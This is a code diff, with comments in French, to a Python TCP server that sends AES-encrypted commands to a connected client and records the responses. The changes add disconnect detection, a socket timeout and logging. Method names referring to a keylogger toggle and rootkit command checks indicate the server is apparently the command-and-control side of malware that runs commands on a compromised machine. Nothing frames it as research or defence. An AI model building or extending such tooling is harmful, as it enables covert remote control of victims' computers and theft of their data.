@@ -3,6 +3,7 @@ from utils.server.AESNetworkHandler import AESNetworkHandler
 import socket
 import threading
 import queue
+import errno
 from typing import Optional
 
 class Request:
@@ -99,6 +100,18 @@ class TCPServer:
     def is_klg_on(self) -> bool:
         return self._klg_on
 
+    def _is_socket_closed(self, sock: socket.socket) -> bool:
+        try:
+            data = sock.recv(1, socket.MSG_PEEK)
+            if data == b'':
+                return True
+        except socket.error as e:
+            if e.errno in [errno.ECONNRESET, errno.EBADF, errno.ENOTCONN]:
+                return True
+            elif e.errno in [errno.EWOULDBLOCK, errno.EAGAIN]:
+                return False
+        return False
+
     def _accept_client_loop(self) -> None:
         while self._running:
             try:
@@ -119,7 +132,16 @@ class TCPServer:
 
     def _handle_client(self) -> None:
         try:
+            # Ajouter un timeout à la socket pour éviter les blocages longs
+            self._client_socket.settimeout(2.0)
+
             while self._running:
+                # Vérifie si le client s'est déconnecté
+                if self._client_socket is None or self._is_socket_closed(self._client_socket):
+                    print("[SOCKET] Client disconnected.")
+                    break
+
+                # Récupère la requête à envoyer, ou passe si la file est vide
                 try:
                     request: Request = self._send_queue.get(timeout=1)
                 except queue.Empty:
@@ -128,32 +150,43 @@ class TCPServer:
                 if request is None:
                     break
 
+                # Historique de commande
                 if request.add_to_history:
                     self._command_history.append({"command": request.message, "stdout": "", "stderr": ""})
 
+                # Envoi de la commande chiffrée
                 success = self._network_handler.send(self._client_socket, request.message)
                 if not success:
+                    print("[ERROR] Failed to send message.")
                     break
 
                 print(f"[SENT] {request.message}")
 
+                # Réception de la réponse chiffrée
                 response = self._network_handler.receive(self._client_socket)
                 if response is False:
+                    print("[ERROR] Failed to receive response.")
                     break
 
                 print(f"[RECEIVED] {response}")
+
+                # File de réponses + analyse
                 self._recv_queue.put(response)
                 self._check_rootkit_command(response)
                 self._update_command_history(response)
 
+                # Débloque le thread demandeur
                 request.response = response
                 request.event.set()
 
+        except socket.timeout:
+            print("[TIMEOUT] Socket timed out. Exiting client handler.")
         except Exception as e:
             print(f"[HANDLE CLIENT ERROR] {e}")
         finally:
             if self._client_socket:
                 self._client_socket.close()
+
 
     def _check_rootkit_command(self, message: str) -> None:
         message = message.strip()
